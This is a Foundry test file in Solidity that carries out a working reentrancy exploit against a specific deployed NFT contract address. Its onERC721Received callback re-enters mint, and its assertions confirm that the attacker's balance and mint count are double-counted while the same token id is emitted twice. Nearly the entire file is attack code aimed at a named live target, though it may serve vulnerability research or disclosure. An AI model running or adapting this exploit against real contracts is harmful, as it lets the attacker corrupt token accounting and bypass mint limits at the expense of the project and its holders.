// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface Guitarist {
    function mint(uint256 quantity) external payable;
    function totalSupply() external view returns (uint256);
    function publicSaleCost() external view returns (uint256);
    function public_mint_status() external view returns (bool);
    function publicMinted(address account) external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function ownerOf(uint256 tokenId) external view returns (address);
    function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
}

contract ExploitTest is Test {
    address constant TARGET = 0xA249d8F280BA32Ab3E95bDdf4F3DBDE059d62AC3;
    address attacker = address(this);
    Guitarist guitarist = Guitarist(TARGET);

    bool private reentered;
    uint256 private mintValue;

    function setUp() public {
        deal(attacker, 1 ether);
        require(guitarist.public_mint_status(), "public mint inactive on fork");
        mintValue = guitarist.publicSaleCost();
    }

    function testExploit() public {
        uint256 initialSupply = guitarist.totalSupply();
        uint256 initialBalance = guitarist.balanceOf(attacker);
        uint256 initialPublicMinted = guitarist.publicMinted(attacker);

        vm.recordLogs();
        guitarist.mint{value: mintValue}(1);
        Vm.Log[] memory entries = vm.getRecordedLogs();

        bytes32 transferSig = keccak256("Transfer(address,address,uint256)");
        uint256 duplicatedTokenId;
        uint256 duplicateTransfers;
        for (uint256 i = 0; i < entries.length; i++) {
            Vm.Log memory logEntry = entries[i];
            if (logEntry.emitter != TARGET || logEntry.topics.length != 4) continue;
            if (logEntry.topics[0] != transferSig) continue;
            if (logEntry.topics[1] != bytes32(0)) continue;

            address to = address(uint160(uint256(logEntry.topics[2])));
            if (to != attacker) continue;

            uint256 tokenId = uint256(logEntry.topics[3]);
            if (duplicateTransfers == 0) {
                duplicatedTokenId = tokenId;
            } else {
                assertEq(tokenId, duplicatedTokenId, "reentrancy should replay the same token id");
            }
            duplicateTransfers++;
        }

        uint256 finalSupply = guitarist.totalSupply();
        uint256 finalBalance = guitarist.balanceOf(attacker);
        uint256 finalPublicMinted = guitarist.publicMinted(attacker);

        // Correct interpretation: the old ERC721A mint path corrupts accounting,
        // but does not mint a second fresh token range.
        assertEq(finalSupply, initialSupply + 1, "totalSupply should advance only once");
        assertEq(finalBalance, initialBalance + 2, "attacker balance should be double-counted");
        assertEq(finalPublicMinted, initialPublicMinted + 2, "publicMinted should be double-counted");
        assertEq(duplicateTransfers, 2, "the same token id should emit Transfer twice");
        assertEq(guitarist.ownerOf(duplicatedTokenId), attacker, "duplicated token should belong to attacker");

        // The enumerable view trusts balanceOf(attacker), which is now inconsistent
        // with the actual discoverable token set.
        vm.expectRevert();
        guitarist.tokenOfOwnerByIndex(attacker, initialBalance + 1);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        if (!reentered) {
            reentered = true;
            guitarist.mint{value: mintValue}(1);
        }
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}

